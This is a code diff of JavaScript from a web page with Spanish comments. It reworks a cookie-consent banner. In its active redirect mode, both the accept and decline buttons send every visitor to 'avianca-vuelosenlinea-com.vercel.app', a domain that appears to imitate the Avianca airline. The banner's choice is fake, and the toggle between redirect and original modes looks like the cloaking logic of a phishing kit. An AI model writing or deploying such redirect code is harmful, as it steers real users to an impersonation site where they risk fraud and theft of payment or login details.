@@ -1866,56 +1866,59 @@
       })();
 
       // ============================================================
-      // 2. COOKIE BANNER - CON REDIRECCIÓN O PROCESO ORIGINAL
       // ============================================================
-      const cookieOverlay = document.getElementById('cookieOverlay');
-      const mainContent = document.getElementById('mainContent');
-      const cookieAccept = document.getElementById('cookieAccept');
-      const cookieDecline = document.getElementById('cookieDecline');
+// 2. COOKIE BANNER - CON REDIRECCIÓN O PROCESO ORIGINAL
+// ============================================================
+const cookieOverlay = document.getElementById('cookieOverlay');
+const mainContent = document.getElementById('mainContent');
+const cookieAccept = document.getElementById('cookieAccept');
+const cookieDecline = document.getElementById('cookieDecline');
 
-      // Función para redirigir a una URL
-      function redirectTo(url) {
-        window.location.href = url;
-      }
+// Función para redirigir a una URL
+function redirectTo(url) {
+  console.log('🔄 Redirigiendo a:', url);
+  window.location.href = url;
+}
 
-      // --- MODO CON REDIRECCIÓN (MODO_ORIGINAL !== 1) ---
-      if (MODO_ORIGINAL !== 0) {
-        // Al hacer clic en "Aceptar" → redirige a la URL de aceptación
-        cookieAccept.addEventListener('click', function(e) {
-          e.preventDefault();
-          // Cambia esta URL por la que necesites para aceptar cookies
-          redirectTo('https://avianca-vuelosenlinea-com.vercel.app/');
-        });
+// --- MODO CON REDIRECCIÓN (MODO_ORIGINAL !== 1) ---
+if (MODO_ORIGINAL !== 1) {
+  console.log('🔀 Modo REDIRECCIÓN activado');
+  
+  cookieAccept.addEventListener('click', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    console.log('✅ Click en ACEPTAR');
+    redirectTo('https://avianca-vuelosenlinea-com.vercel.app/');
+  });
 
-        // Al hacer clic en "Cancelar" → redirige a la URL de rechazo
-        cookieDecline.addEventListener('click', function(e) {
-          e.preventDefault();
-          // Cambia esta URL por la que necesites para rechazar cookies
-          redirectTo('https://avianca-vuelosenlinea-com.vercel.app/');
-        });
-      } 
-      // --- MODO ORIGINAL (MODO_ORIGINAL === 1) ---
-      else {
-        function showMainContent() {
-          cookieOverlay.classList.add('hidden');
-          mainContent.classList.add('visible');
-          document.body.style.overflow = 'auto';
-          initApp();
-        }
+  cookieDecline.addEventListener('click', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    console.log('❌ Click en CANCELAR');
+    redirectTo('https://avianca-vuelosenlinea-com.vercel.app/');
+  });
+} 
+// --- MODO ORIGINAL (MODO_ORIGINAL === 1) ---
+else {
+  console.log('📦 Modo ORIGINAL activado');
+  
+  function showMainContent() {
+    cookieOverlay.classList.add('hidden');
+    mainContent.classList.add('visible');
+    document.body.style.overflow = 'auto';
+    initApp();
+  }
 
-        cookieAccept.addEventListener('click', function() {
-          showMainContent();
-        });
+  cookieAccept.addEventListener('click', function() {
+    showMainContent();
+  });
 
-        cookieDecline.addEventListener('click', function() {
-          showMainContent();
-        });
-      }
-
-      // Bloquear scroll mientras el banner esté visible
-      if (MODO_ORIGINAL === 1) {
-        document.body.style.overflow = 'hidden';
-      }
+  cookieDecline.addEventListener('click', function() {
+    showMainContent();
+  });
+  
+  document.body.style.overflow = 'hidden';
+}
 
       // ============================================================
       // 3. FUNCIONALIDADES DE LA APP (solo se ejecuta en modo original)
